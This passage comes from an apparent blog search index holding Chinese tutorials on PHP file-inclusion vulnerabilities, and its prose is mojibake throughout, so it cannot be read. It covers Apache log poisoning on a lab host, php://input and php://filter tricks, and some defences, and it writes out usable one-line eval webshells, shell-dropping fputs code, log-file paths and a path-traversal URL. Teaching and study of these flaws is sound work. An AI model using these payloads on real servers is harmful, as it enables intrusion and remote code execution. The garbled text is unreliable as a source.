ä¸zip://åè®®ç±»ä¼¼ï¼Œä½†ç”¨æ³•ä¸åŒï¼Œzip://ä¼ªåè®®ä¸­æ˜¯ç”¨#æŠŠå‹ç¼©æ–‡ä»¶è·¯å¾„å’Œå‹ç¼©æ–‡ä»¶çš„å­æ–‡ä»¶åéš”å¼€ï¼Œè€Œphar://ä¼ªåè®®ä¸­æ˜¯ç”¨/æŠŠå‹ç¼©æ–‡ä»¶è·¯å¾„å’Œå‹ç¼©æ–‡ä»¶çš„å­æ–‡ä»¶åéš”å¼€ã€‚ ç”¨æ³•ï¼š ?page=phar://[å‹ç¼©æ–‡ä»¶è·¯å¾„]/[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] ä½¿ç”¨phar://å¯¹1.zipæ–‡ä»¶è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼š 1.7æ–‡ä»¶åŒ…å«æ—¥å¿—è¯»å– æ—¥å¿—ä¼šè®°å½•å®¢æˆ·ç«¯è¯·æ±‚åŠæœåŠ¡å™¨å“åº”çš„ä¿¡æ¯ï¼Œè®¿é—®http://www.xx.com/æ—¶ï¼Œä¹Ÿä¼šè¢«è®°å½•åœ¨æ—¥å¿—é‡Œï¼Œä¹Ÿå¯ä»¥æ’å…¥åˆ°User-Agentï¼Œä½†æ˜¯è¯·æ±‚çš„ä¿¡æ¯æœ‰å¯èƒ½è¢«urlç¼–ç ä¹‹åè®°å½•æ—¥å¿—ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡burpæ¥å‘é€è¯·æ±‚åŒ…æ¥é˜²æ­¢è¢«ç¼–ç ï¼Œé€šè¿‡ç›¸å¯¹è·¯å¾„æ‰¾åˆ°æ—¥å¿—æ–‡ä»¶ï¼Œåˆ©ç”¨åŒ…å«æ¼æ´æ‰§è¡Œã€‚å„ç±»æ—¥å¿—å­˜åœ¨ä½ç½® 1.1 æ¼æ´åŸç† å½“æŸä¸ªPHPæ–‡ä»¶å­˜åœ¨æœ¬åœ°åŒ…å«æ¼æ´ï¼Œè€Œå´æ— æ³•ä¸Šä¼ æ­£å¸¸æ–‡ä»¶ï¼Œè¿™å°±æ„å‘³è¿™æœ‰åŒ…å«æ¼æ´å´ä¸èƒ½æ‹¿æ¥åˆ©ç”¨ï¼Œè¿™æ—¶æ”»å‡»è€…å°±æœ‰å¯èƒ½ä¼šåˆ©ç”¨apacheæ—¥å¿—æ–‡ä»¶æ¥å…¥ä¾µã€‚ ApacheæœåŠ¡å™¨è¿è¡Œåä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯access.log(è®¿é—®æ—¥å¿—)å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼Œapacheçš„æ—¥å¿—æ–‡ä»¶è®°å½•ä¸‹æˆ‘ä»¬çš„æ“ä½œï¼Œå¹¶ä¸”å†™åˆ°è®¿é—®æ—¥å¿—æ–‡ä»¶access.logä¹‹ä¸­ã€‚ 1.2 åˆ©ç”¨æ–¹æ³• é€šè¿‡æ—¥å¿—æ–‡ä»¶getshellï¼š 1.é€šè¿‡burpsuiteå‘é€çš„è¯·æ±‚åŒ…äº§ç”Ÿæ—¥å¿—æ•°æ®ï¼› 2.åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼› 3.å†™å…¥ä¸€å¥è¯æœ¨é©¬getshell 1.3 Apache apacheå­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶æ—¥å¿—æ–‡ä»¶ï¼Œaccess.logæ˜¯è®°å½•ç™»å½•ç­‰ä¿¡æ¯çš„æ—¥å¿—æ–‡ä»¶ï¼Œè€Œerror.logæ˜¯é”™è¯¯æ–‡ä»¶ã€‚ 1ï¼‰Windowsç³»ç»Ÿï¼š apacheå®‰è£…ç›®å½•/logs/access.logæˆ–è€…error.log 2ï¼‰linuxç³»ç»Ÿï¼š /var/log/apache/access.logæˆ–è€…error.log /var/log/apache2/access.logæˆ–è€…error.log /etc/httpd/logs/access_logæˆ–è€…error.log å®æ“ï¼š 1. æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼š D:\\labwork\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs è¿™é‡Œä¸»è¦æŸ¥çœ‹access.logè¿™ä¸ªæ—¥å¿—ï¼Œè¿™ä¸ªæ—¥å¿—è®°å½•ç€æœåŠ¡å™¨æ‰€æœ‰çš„è®¿é—®è®°å½•ï¼ŒåŒ…æ‹¬ä¸€äº›æ”»å‡»æµé‡ï¼š 2. æ²¡æœ‰access.logè®¿é—®æ—¥å¿—çš„åŸå› ï¼š è¿›å…¥æ—¥å¿—ç›®å½•ä¸‹ï¼Œå¦‚æœå‘ç°æ²¡æœ‰access.logè¿™ä¸ªè®¿é—®æ—¥å¿—ï¼Œæ˜¯å› ä¸ºapacheé…ç½®æ–‡ä»¶æ²¡æœ‰æ‰“å¼€è¿™ä¸ªé…ç½®é€‰é¡¹ï¼Œéœ€è¦å¯¹ç›¸åº”çš„åŠŸèƒ½è¿›è¡Œå¼€å¯ã€‚ 3. å¼€å¯access.logè®¿é—®æ—¥å¿—åŠŸèƒ½ï¼š 1ã€é€šè¿‡é…ç½®æ–‡ä»¶çš„å¼€å¯access.logè®¿é—®æ—¥å¿—åŠŸèƒ½ï¼š 2ã€æœç´¢CustomLog \"logs/access.log\" commonï¼Œå°†å‰é¢çš„##æ³¨é‡Šå»æ‰ï¼Œå¹¶ä¿å­˜æ–‡ä»¶ï¼Œç„¶åé‡å¯PHPstudy: 3ã€æŸ¥çœ‹è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼Œæ—¥å¿—ç›®å½•ä¸‹å·²ç»å‡ºç°è¿™ä¸ªæ–‡ä»¶ï¼Œè¯´æ˜æˆåŠŸå¼€å¯è®¿é—®æ—¥å¿—åŠŸèƒ½ï¼š 4ã€è®¿é—®å‡ ä¸ªç½‘é¡µï¼ŒæŸ¥çœ‹è®°å½•ï¼Œå¯¹è‡ªå·±è®¿é—®çš„é¡µé¢æœ‰è®°å½•ï¼Œè¯´æ˜access.logå¯ä»¥è‡ªåŠ¨è®°å½•è®¿é—®æ“ä½œï¼š å®æ“è¿‡ç¨‹ï¼š 1ã€æˆ‘ä»¬é€šè¿‡è®¿é—®ï¼Œè®©è®¿é—®æ—¥å¿—è®°å½•æˆ‘ä»¬çš„phpinfo();ä»£ç ï¼Œå¯ä»¥çœ‹å‡ºï¼Œè®¿é—®æ—¥å¿—å·²ç»æˆåŠŸè®°å½•äº†æˆ‘ä»¬çš„è®¿é—®å†å²ï¼š è®¿é—®å†…å®¹ï¼š &lt;?php phpinfo();?&gt; æ³¨ï¼šé€šè¿‡ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œæ—¥å¿—å·²ç»æˆåŠŸè®°å½•æˆ‘ä»¬çš„è®¿é—®å†å²ï¼Œä½†æ˜¯æ˜¯ç»è¿‡URLç¼–ç åçš„ç»“æœã€‚å¦‚ä½•è®©å®ƒè®°å½•æˆ‘ä»¬åŸå§‹å®Œæ•´çš„ä»£ç å‘¢ï¼Ÿä¸€èˆ¬URLç¼–ç æ˜¯æˆ‘ä»¬çš„æµè§ˆå™¨è¿›è¡Œå®Œæˆçš„ï¼Œå®ƒå¯¹æˆ‘ä»¬è®¿é—®çš„ç›®å½•åšäº†URLç¼–ç ï¼Œç„¶åå‘é€åˆ°æœåŠ¡å™¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpsuiteï¼ŒæŠŠç»è¿‡æµè§ˆå™¨URLç¼–ç åçš„æ•°æ®è¿›è¡Œä¿®æ”¹ã€‚ 2ã€ä½¿ç”¨burpsuiteä¿®æ”¹ç¼–ç åçš„æ•°æ®ï¼š 3ã€æŸ¥çœ‹è®¿é—®æ—¥å¿—ï¼Œå¯ä»¥çœ‹å‡ºï¼Œæ²¡æœ‰ç¼–ç çš„phpinfo();ä»£ç å·²ç»æˆåŠŸè®°å½•ï¼š 4ã€æ–‡ä»¶åŒ…å«åªè¦æ–‡ä»¶ä¸­æœ‰phpä»£ç ï¼Œå®ƒå°±ä¼šæŠŠè¿™ä¸ªæ–‡ä»¶å½“åšphpè„šæœ¬è¿›è¡Œè§£æï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åŒ…å«è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œè®©ç›®æ ‡æœåŠ¡å™¨æŠŠæ—¥å¿—æ–‡ä»¶è§£æä¸ºphpè„šæœ¬ï¼›å¯ä»¥çœ‹å‡ºï¼Œå·²ç»æˆåŠŸè§£ææ—¥å¿—æ–‡ä»¶ä¸ºphpè„šæœ¬ï¼š 5ã€è®©è®¿é—®æ—¥å¿—æ–‡ä»¶è®°å½•ä¸‹å†™å…¥æ–‡ä»¶è„šæœ¬ä»£ç ï¼š è®¿é—®å†…å®¹ï¼š &lt;?php $file=fopen('test1.php','w');fputs($file,'&lt;?php @eval($_POST[1]);?&gt;');?&gt; 6ã€å¯¹è®¿é—®æ—¥å¿—è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œå¹¶æŸ¥çœ‹åˆ›å»ºçš„ä¸€å¥è¯è„šæœ¬ï¼Œå·²ç»åˆ›å»ºæˆåŠŸï¼š è¿™é‡Œä¸çŸ¥ä¸ºä½•è€æ˜¯è¢«æˆªæ–­ï¼Œè¯´æ˜¯æœ‰ç‰¹æ®Šå­—ç¬¦æˆ–è€…é•¿åº¦è¿‡é•¿ï¼Œæˆ‘ä¸ç†è§£ï¼Œå°±å…ˆå­¦ä¸ªæ€è·¯å§ ä¸‹é¢æ˜¯æˆåŠŸè€…çš„å›¾ç‰‡ 7ã€ä½¿ç”¨èšå‰‘è¿æ¥webshellï¼ŒæˆåŠŸè·å¾—é¶æœºçš„webshellæƒé™ï¼š 1.4 Nginx nginxå­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶æ—¥å¿—æ–‡ä»¶ï¼Œaccess.logæ˜¯è®°å½•ç™»å½•ç­‰ä¿¡æ¯çš„æ—¥å¿—æ–‡ä»¶ï¼Œè€Œerror.logæ˜¯é”™è¯¯æ–‡ä»¶ã€‚ 1ï¼‰Windowsç³»ç»Ÿï¼š nginxå®‰è£…ç›®å½•/logs/access.logæˆ–è€…error.log 2ï¼‰linuxç³»ç»Ÿï¼š /var/log/nginx/access.logæˆ–è€…error.log 1.5 IIS 1ï¼‰iis6.0ç‰ˆæœ¬ C:\\windows\\system32\\LogFiles 2ï¼‰iis7.5ç‰ˆæœ¬ %SystemDrive%\\inetpub\\logs\\LogFiles 1.6 åŒ…å«Apacheæ—¥å¿—æ¡ˆä¾‹ Apacheè¿è¡Œåä¸€èˆ¬é»˜è®¤ä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œaccess.log(è®¿é—®æ—¥å¿—)ï¼Œerror.log(é”™è¯¯æ—¥å¿—)ã€‚ ä¸‹å›¾å°±æ˜¯è¢«è½¬ç çš„ï¼Œåªéœ€è¦æ‰‹åŠ¨ä¿®æ”¹ä¸€ä¸‹é‡æ–°å‘é€å³å¯ã€‚(è¿™é‡Œçš„è½¬ç å°±ä¸å™è¿°äº†, ä¸Šè¿°æœ‰: 1.5.6 è¿œç¨‹æ–‡ä»¶è¯»å–) URLï¼šhttp://192.168.10.150/&lt;?php @eval($_POST[123]);?&gt; é€šè¿‡å¯¹æœ¬åœ°çš„æ—¥å¿—æ–‡ä»¶è¿›è¡ŒåŒ…å«è¯»å–ï¼Œè¾“å…¥123=phpinfo();ã€‚ URL:http://192.168.10.150/1.php/?name=../Apache/logs/error.log POST: 123 = phpinfo(); å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨èšå‰‘æ¥è¿›è¡Œè¿æ¥ã€‚ URLï¼šhttp://192.168.10.150/1.php/?name=../Apache/logs/error.log è¿æ¥å¯†ç ï¼š123 1.8æ–‡ä»¶åŒ…å«æ¼æ´æ”»å‡»é˜²èŒƒ â€‹ æ–‡ä»¶åŒ…å«æ¼æ´å·²ç»æ˜¯Webå®‰å…¨å²ä¸Šç»å¸¸ç”¨çš„æ”»å‡»æ‰‹æ®µï¼Œä¸”å®ƒçš„åˆ©ç”¨æ–¹å¼ç®€å•ï¼Œé€ æˆçš„å±å®³å·¨å¤§ï¼Œè™½ç„¶æˆ‘ä»¬ç°åœ¨å·²ç»æœ‰äº†å¾ˆå…¨é¢çš„é˜²èŒƒå¯¹ç­–ï¼Œä½†æ˜¯å®ƒçš„å±å®³è¿˜æ˜¯å¾ˆå¤§ï¼Œä¸Šè¿°å®éªŒæˆ‘å·±ç»ä»å¤šç§è§’åº¦è§£æäº†æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¹Ÿé˜è¿°äº†å®ƒå¯ä»¥åšçš„äº‹æƒ…å·²ç»é€ æˆçš„å±å®³ï¼Œä¸‹é¢æˆ‘ä»¬å¼€å§‹ç€é‡ä»‹ç»æ€ä¹ˆå¯¹æ­¤æ¼æ´è¿›è¡Œé˜²èŒƒå’Œæ£€æµ‹ï¼Œé¿å…é€ æˆä¸å¿…è¦çš„æŸå¤±ã€‚ 0x01æ£€æŸ¥æœåŠ¡å™¨é…ç½®æ–‡ä»¶ â€‹ åœ¨phpä¸­æœ‰ä¸ªphp.iniçš„é…ç½®æ–‡ä»¶ï¼Œé‡Œé¢å¤§æ¦‚æ˜¯å¯¹phpè¯­è¨€æ‰€æœ‰åŠŸèƒ½é…ç½®æ–‡ä»¶é›†åˆï¼Œå…¶ä¸­é‡Œé¢æœ‰ä¸¤é¡¹æ˜¯allow_url_fopenã€allow_url_includeä¸¤ä¸ªé€‰é¡¹ï¼Œå…¶ä¸­allow_url_fopené»˜è®¤æ˜¯å¼€å¯çš„ï¼Œallow_url_includeé»˜è®¤æ˜¯å…³é—­çš„ï¼Œå¦‚æœæˆ‘ä»¬å¼€å¯è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¼ªåè®®è¯»å–æˆ‘ä»¬çš„æ•æ„Ÿä¿¡æ¯å’Œå…¶å®ƒæ“ä½œï¼Œè™½ç„¶å¼€å¯allow_url_fopenä¹Ÿå¯ä»¥è¯»å–æˆ‘ä»¬çš„æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿‡æ»¤ä¸€äº›å­—ç¬¦æˆ–è€…é™åˆ¶ç”¨æˆ·çš„è¾“å…¥ä»è€Œè¾¾åˆ°æ”»å‡»è€…ä¸èƒ½è¯»å–æˆ‘ä»¬ä¿¡æ¯çš„æ“ä½œã€‚ 0x02è¿‡æ»¤ç‰¹æ®Šç¬¦å· â€‹ åœ¨è¿›è¡Œæ–‡ä»¶åŒ…å«çš„æ—¶å€™æˆ‘ä»¬å¯èƒ½ç»å¸¸ä¼šç”¨åˆ°å‡ ä¸ªå›ºå®šçš„å­—ç¬¦ï¼Œæˆ–è€…æˆ‘ä»¬åœ¨ç”¨ä¼ªåè®®çš„æ—¶å€™æˆ‘ä»¬ä¹Ÿä¼šä½¿ç”¨ç‰¹å®šçš„å­—ç¬¦ï¼Œä¾‹å¦‚ï¼š\\ï¼Œ//ï¼Œinputï¼Œoutputï¼Œfilterç­‰æˆ‘ä»¬å¯ä»¥å°†è¿™äº›é“­æ„Ÿå­—ç¬¦éƒ½ç»™è¿‡æ»¤æ‰ã€‚ä»£ç å¦‚ä¸‹ &lt;?php show_source(__FILE__); $file = $_GET['file']; $file = str_replace( array( \"http://\",\"file://\"), \"\",$file); $file = str_replace( array(\"../\", \"..\\\"\"), \"\",$file); $file = str_replace( array(\"/\", \"\\\\\"), \"\",$file); include $file; ?&gt; æ­¤æ—¶æˆ‘ä»¬å†ç”¨æˆ‘ä»¬ä¹‹å‰çš„æ”»å‡»æ‰‹æ³•ï¼Œå‘ç°å·²ç»è¯»å–ä¸åˆ°æ–‡ä»¶äº†ã€‚ å› ä¸ºstr_repleaceåªä¼šæ›¿æ¢ä¸€æ¬¡ï¼Œå¯ä»¥æœ‰åŠæ³•ç»•è¿‡çš„ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¿˜æœ‰æ­£åˆ™åŒ¹é…çš„æ–¹å¼ï¼Œåªè¦ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²è¢«æˆ‘ä»¬æ­£åˆ™åŒ¹é…æˆ‘ä»¬å°±ä¼šè­¦å‘Šç»“æŸç¨‹åºçš„è¿è¡Œã€‚æˆ‘ä»¬æ¥çœ‹ä¸‹æˆ‘ä»¬çš„æºç ã€‚ &lt;?php show_source(__FILE__); $file = $_GET['file']; if(preg_match(\"/..\\/|http|ftp|\\/|\\/\\//\", $file)){ echo \"ä¸åˆæ³•å­—ç¬¦\"; }else{ include $file; } 0x03æŒ‡å®šåŒ…å«çš„æ–‡ä»¶ ï¼ˆç™½åå•ï¼‰ â€‹ æˆ‘ä»¬åœ¨åšç½‘ç«™å¼€å‘çš„æ—¶å€™æˆ‘ä»¬å¯èƒ½ç»å¸¸ä¼šä½¿ç”¨æˆ‘ä»¬æ–‡ä»¶åŒ…å«çš„å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬å‘¢åŒ…å«çš„æ–‡ä»¶éƒ½æ˜¯æˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬éœ€è¦åŒ…å«ä»€ä¹ˆæ–‡ä»¶ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬åœ¨åŒ…å«æ–‡ä»¶çš„æ—¶å€™å°±å¯ä»¥æ·»åŠ ä¸€æ¡è§„åˆ™ï¼Œè®©æˆ‘ä»¬åªèƒ½åŒ…å«æŒ‡å®šçš„æ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬åŒ…å«äº†éæŒ‡å®šçš„æ–‡ä»¶ï¼Œç¨‹åºå°±ä¼šæŠ¥é”™é€€å‡ºã€‚ä¸‹é¢æ¥çœ‹ä¸‹æˆ‘ä»¬å®ç°çš„æ–¹æ³•ã€‚ &lt;?php show_source(__FILE__); $file = $_GET['file']; if($file != \"flag.php\"){ echo \"Error!\"; die(); } 0x04è®¾ç½®æ–‡ä»¶ç›®å½• â€‹ phpçš„é…ç½®æ–‡ä»¶ä¸­æœ‰open_basediré€‰é¡¹å¯ä»¥è®¾ç½®ç”¨æˆ·éœ€è¦æ‰§è¡Œçš„æ–‡ä»¶ç›®å½•ï¼Œå¦‚æœè®¾ç½®æ–‡ä»¶ç›®å½•çš„è¯ï¼Œæˆ‘ä»¬ç¼–å†™çš„è„šæœ¬åªä¼šåœ¨è¯¥ç›®å½•ä¸­æœç´¢æ–‡ä»¶ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŠŠæˆ‘ä»¬éœ€è¦åŒ…å«çš„æ–‡ä»¶æ”¾åˆ°è¿™ä¸ªç›®å½•å°±å¯ä»¥äº†ï¼Œä»è€Œä¹Ÿé¿å…äº†æ•æ„Ÿæ–‡ä»¶çš„æ³„éœ²ã€‚ æ¼æ´ä¿®å¤ é¦–å…ˆæ˜¯æ— è§£çš„WAFäº§å“ å›ºå®šåç¼€ï¼šæ·»åŠ æ–‡ä»¶åç¼€åˆ°æ‰€åŒ…å«çš„æ–‡ä»¶åã€‚å®æˆ˜æƒ…å†µä¸‹ä¸æ¸…æ¥šæ‰€æ·»åŠ çš„åç¼€ï¼ŒæœªçŸ¥å°†åœ¨é€ æˆæ›´å¤šçš„ç–‘è™‘ï¼Œä½†æ˜¯å¯ä»¥æµ‹ä¸€æµ‹ å›ºå®šæ–‡ä»¶ï¼šä¼¼ä¸Cè¯­è¨€å¤´æ–‡ä»¶ï¼Œä¸è¿›è¡Œæ‰€åŒ…å«æ–‡ä»¶çš„ä¿®æ”¹ï¼Œéƒ½å®šä¸‹æ¥ã€‚ å¯¹å¯å˜çš„æ‰€åŒ…å«æ–‡ä»¶åè¿›è¡Œæ£€æµ‹ï¼ ä¸€èˆ¬javaçš„ç«™ç‚¹å­˜åœ¨æ–‡ä»¶ç³»åˆ—çš„æ´æ¯”è¾ƒå¤š(é™¤äº†æ–‡ä»¶åŒ…å«)ã€‚","categories":["å¸¸è§topæ¼æ´"]},{"title":"æµ…ææ–‡ä»¶åŒ…å«","path":"/2023/08/07/qian-xi-wen-jian-bao-han/","content":"æ–‡ä»¶åŒ…å«æ€»ç»“ 0x01 æ–‡ä»¶åŒ…å«çš„æ¦‚å¿µï¼š æŠŠå¯é‡å¤ä½¿ç”¨çš„å‡½æ•°å†™å…¥åˆ°å•ä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ä½¿ç”¨è¯¥å‡½æ•°æ—¶ï¼Œç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶ï¼Œæ— éœ€å†æ¬¡ç¼–å†™å‡½æ•°ã€‚è¿™ä¸€è°ƒç”¨æ–‡ä»¶çš„è¿‡ç¨‹è¢«ç§°ä¸ºåŒ…å«ã€‚ 1.1 æ–‡ä»¶åŒ…å«çš„åŸç†ï¼š æ–‡ä»¶åŒ…å«æ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯åœ¨é€šè¿‡PHPå‡½æ•°å¼•å…¥æ–‡ä»¶æ—¶ï¼Œç”±äºä¼ å…¥çš„æ–‡ä»¶åæ²¡æœ‰ç»è¿‡åˆç†çš„æ ¡éªŒï¼Œä»è€Œæ“ä½œäº†é¢„æƒ³ä¹‹å¤–çš„æ–‡ä»¶ï¼Œå°±å¯èƒ½å¯¼è‡´æ„å¤–çš„æ–‡ä»¶æ³„éœ²ç”šè‡³æ¶æ„çš„ä»£ç æ³¨å…¥ã€‚ 1.2 æ–‡ä»¶åŒ…å«åˆ†ç±»ï¼š æ–‡ä»¶åŒ…å«åˆ†ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œè€ŒåŒºåˆ†äºŒè€…æœ€ç®€å•çš„åŠæ³•å°±æ˜¯é€šè¿‡æŸ¥çœ‹php.iniä¸­æ˜¯å¦å¼€å¯äº†allow_ url_ include. å¦‚æœå¼€å¯å°±æœ‰å¯èƒ½åŒ…å«è¿œç¨‹æ–‡ä»¶ã€‚è¿œç¨‹æ–‡ä»¶åŒ…å«éœ€è¦php.iniä¸­allow_ ur_ include=on, allow_ ur_ fopen = Onã€‚åœ¨php.iniä¸­ï¼Œallow_ url_ fopené»˜è®¤ä¸€ç›´æ˜¯On,è€Œallow_ url_ includeä»php5.2ä¹‹åå°±é»˜è®¤ä¸ºOffã€‚ æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼šåŒ…å«æœåŠ¡å™¨ä¸Šçš„èµ„æº //èƒ½å¤Ÿæ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œæˆ‘ä»¬ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLFIï¼‰ã€‚ è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼šé€šè¿‡HTTPåè®®åŒ…å«å…¶ä»–åœ°æ–¹çš„èµ„æº 1.3 æ–‡ä»¶åŒ…å«å‡½æ•°ï¼š 1, include():æ‰¾ä¸åˆ°è¢«åŒ…å«æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿè­¦å‘Š(E_ WARNING) ; 2ï¼Œinclude_ once(): ä¸include () ç±»ä¼¼ï¼Œä»£ç å·²ç»è¢«åŒ…å«åˆ™ä¸ä¼šå†æ¬¡åŒ…å« 3ï¼Œrequire():æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯(E_ COMPILE ERROR) 4ï¼Œrequire_ once():ä¸require ()ç±»ä¼¼ï¼Œä»£ç å·²ç»è¢«åŒ…å«åˆ™ä¸ä¼šå†æ¬¡åŒ…å« æ€ç»´å¯¼å›¾ï¼š 0x02 PHPä¼ªåè®®ï¼š PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚ 2.1 php://input php://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ pocï¼š ?file=php://input [POST DATA] &lt;?php phpinfo();?&gt; æ³¨ï¼šåˆ©ç”¨php://inputè¿˜å¯ä»¥å†™å…¥phpæœ¨é©¬,å³åœ¨postä¸­ä¼ å…¥å¦‚ä¸‹ä»£ç ï¼š &lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt; ä¾‹å­ï¼š //test.php &lt;?php show_source(__FILE__); include('flag.php'); $a= $_GET[\"a\"]; if(isset($a)&amp;&amp;(file_get_contents($a,'r')) === 'I want flag'){ echo \"success \"; echo $flag; } //flag.php &lt;?php $flag = 'flag{flag_is_here}'; ?&gt; å®¡è®¡test.phpçŸ¥ï¼Œå½“å‚æ•°$aä¸ä¸ºç©ºï¼Œä¸”è¯»å–çš„æ–‡ä»¶ä¸­åŒ…å«â€™I want flagâ€™æ—¶ï¼Œå³å¯æ˜¾ç¤º$flagã€‚æ‰€ä»¥å¯ä»¥ä½¿ç”¨php://inputå¾—åˆ°åŸå§‹çš„postæ•°æ®,è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ,å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œæ¥è¿›è¡Œç»•è¿‡ã€‚ æ³¨ï¼šé‡åˆ°file_get_contents()è¦æƒ³åˆ°ç”¨php://inputç»•è¿‡ã€‚ 2.2 php://filter php://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚ å‰ç¼€åç§° ååŠ å†…å®¹ æè¿° resource= è¦è¿‡æ»¤çš„æ•°æ®æµ æŒ‡å®šè¦è¿‡æ»¤çš„æ•°æ®æµ read= è¯»é“¾çš„ç­›é€‰å™¨åˆ—è¡¨ å‚æ•°å¯é€‰ï¼Œå¯è®¾å®šä¸€ä¸ªæˆ–è€…å¤šä¸ªç­›é€‰å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš” write= å†™é“¾çš„ç­›é€‰å™¨åˆ—è¡¨ å‚æ•°å¯é€‰ï¼Œå¯è®¾å®šä¸€ä¸ªæˆ–è€…å¤šä¸ªç­›é€‰å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš” ç©º ä¸¤ä¸ªé“¾çš„ç­›é€‰å™¨åˆ—è¡¨ æ²¡æœ‰ç”¨read=æˆ–è€…write=åšå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šæ˜¯è½»å¿«åº”ç”¨äºè¯»æˆ–è€…å†™ poc1: ?file=php://filter/resource=xxx.php poc2: ?file=php://filter/read=convert.base64-encode/resource=xxx.php ä¸ºäº†è¯»å–åŒ…å«æœ‰æ•æ„Ÿä¿¡æ¯çš„PHPç­‰æºæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±è¦å…ˆå°†â€œå¯èƒ½å¼•å‘å†²çªçš„PHPä»£ç â€ç¼–ç ä¸€éï¼Œè¿™é‡Œ å°±ä¼šç”¨åˆ°php://filterã€‚ php://filterè¯»å–æ–‡ä»¶æºä»£ç çš„æ—¶å€™ éœ€è¦ç”¨åˆ°ç¼–ç å™¨ php://filter/resource=phpinfo.php php://filter/read=convert.base64-encode/resource=phpinfo.php php://filter ä¸€èˆ¬è¯»å–æ–‡ä»¶æºä»£ç ï¼Œç„¶åå†è¿›è¡Œå®¡è®¡ php://filteræ˜¯PHPè¯­è¨€ä¸­ç‰¹æœ‰çš„åè®®æµï¼Œä½œç”¨æ˜¯ä½œä¸ºä¸€ä¸ªâ€œä¸­é—´æµâ€æ¥å¤„ç†å…¶ä»–æµã€‚ 